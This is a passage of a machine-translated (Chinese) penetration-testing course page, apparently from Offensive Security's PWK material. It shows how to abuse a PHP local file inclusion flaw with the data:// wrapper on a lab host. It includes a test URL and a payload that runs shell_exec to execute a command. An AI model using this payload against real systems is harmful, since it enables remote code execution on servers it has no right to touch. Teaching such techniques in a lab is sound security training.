<div style="position:absolute;top:117406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的内容，在本例中为“hello world”。</font><font style="vertical-align: inherit;">当我们把它们放在一起时，我们得到“data:text/plain,hello</font></font></nobr></div>
<div style="position:absolute;top:117426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">世界”。</font></font></nobr></div>
<div style="position:absolute;top:117459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经知道菜单页面容易受到 LFI 攻击。</font><font style="vertical-align: inherit;">如果我们使用数据提交有效载荷</font></font></nobr></div>
<div style="position:absolute;top:117478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包装器，应用程序应将其视为常规文件并将其包含在页面中。</font><font style="vertical-align: inherit;">让我们</font></font></nobr></div>
<div style="position:absolute;top:117497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过提交以下 URL 并检查结果来检查这是否有效：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/menu.php? </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件=数据：文本/普通，</font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你好世界</font></font></font></b></nobr></div>
<div style="position:absolute;top:117551;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 309 - 使用数据包装器的测试负载</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:117619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">279 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PHP 集团，2019 年），https://www.php.net/manual/en/wrappers.php</font></font></font></nobr></div>
<div style="position:absolute;top:117639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">280 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PHP 集团，2019 年），https://www.php.net/manual/en/wrappers.data.php</font></font></font></nobr></div>
<div style="position:absolute;top:117659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">281 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Base64</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:117787;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="100"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 100 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:117820;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:118897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:118897;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:118897;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">320</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:117910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.9.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:117931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们看看这是如何呈现的：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118141;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 158：验证数据包装器工作</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:118171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如所怀疑的那样，应用程序将数据包装器视为文件并将其包含在页面中，</font></font></nobr></div>
<div style="position:absolute;top:118191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示我们的“hello world”字符串。</font></font></nobr></div>
<div style="position:absolute;top:118224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于明文数据包装器起作用，让我们看看我们可以将它推多远。</font><font style="vertical-align: inherit;">我们知道有一个 LFI</font></font></nobr></div>
<div style="position:absolute;top:118243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个页面上的漏洞和前面的例子证明我们可以用数据注入内容</font></font></nobr></div>
<div style="position:absolute;top:118262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包装纸。</font><font style="vertical-align: inherit;">让我们用一些 PHP 代码替换“hello world”并检查它是否执行。</font><font style="vertical-align: inherit;">我们将使用</font></font></nobr></div>
<div style="position:absolute;top:118282;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell_exec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dir</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，包装在 PHP 标签中。</font><font style="vertical-align: inherit;">然后，该 URL 如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/menu.php?file=data:text/plain, </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;?php echo shell_exec("dir") ?&gt;</font></font></font></b></nobr></div>
<div style="position:absolute;top:118336;left:293"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 310 - 使用数据包装器的示例 LFI 负载 </font></font></i></nobr></div>
</span></font>


<script>_addload(function(){_setupIW('com');_csi('en','zh-CN','o3cp%5B221-320%5D.pdf');});</script>
            <script>
              function gtElInit() {
                var lib = new google.translate.TranslateService();
                lib.setCheckVisibility(false);
                lib.translatePage('en', 'zh-CN', function (progress, done, error) {
                  if (progress == 100 || done || error) {
                    document.getElementById("gt-dt-spinner").style.display = "none";
                  }
                });
              }
            </script>
            <script src="./o3cp[221-320]_files/f.txt">
            </script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./o3cp[221-320]_files/translate_24dp.png" width="20" height="20" alt="Google 翻译"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">原文</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">提供更好的翻译建议</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
          <div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><span><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[221-320]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iws_w.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iws_e.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iws_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iws_nw" style="overflow: hidden;"></div><div class="SPRITE_iws_ne" style="overflow: hidden;"></div><div class="SPRITE_iws_sw" style="overflow: hidden;"></div><div class="SPRITE_iws_se" style="overflow: hidden;"></div><div class="SPRITE_iws_tap" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_l" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_u" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ul" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_rd" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ld" style="overflow: hidden;"></div><div class="SPRITE_iws_tab_dl" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_dr" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_l" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_r" style="overflow: hidden; display: none;"></div></div></span><div id="google-infowindow" class="notranslate"><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[221-320]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iw_w.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iw_e.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[221-320]_files/iw_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iw_nw" style="overflow: hidden;"></div><div class="SPRITE_iw_ne" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_l" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_u" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ul" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_rd" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ld" style="overflow: hidden;"></div><div class="SPRITE_iw_sw0" style="overflow: hidden;"></div><div class="SPRITE_iw_se0" style="overflow: hidden;"></div><div class="SPRITE_close" style="overflow: hidden; z-index: 10000; cursor: pointer; visibility: visible;"></div><div class="SPRITE_maximize" style="overflow: hidden; z-index: 10000; visibility: hidden; cursor: pointer; display: none;"></div><div class="SPRITE_restore" style="overflow: hidden; z-index: 10001; visibility: hidden; cursor: pointer; display: none;"></div></div></div><div style="display: none;"><iframe sandbox="" id="google-feedback-frame" name="FEEDBACK_TARGET_IFRAME_NAME" src="./o3cp[221-320]_files/saved_resource.html"></iframe></div></body></html>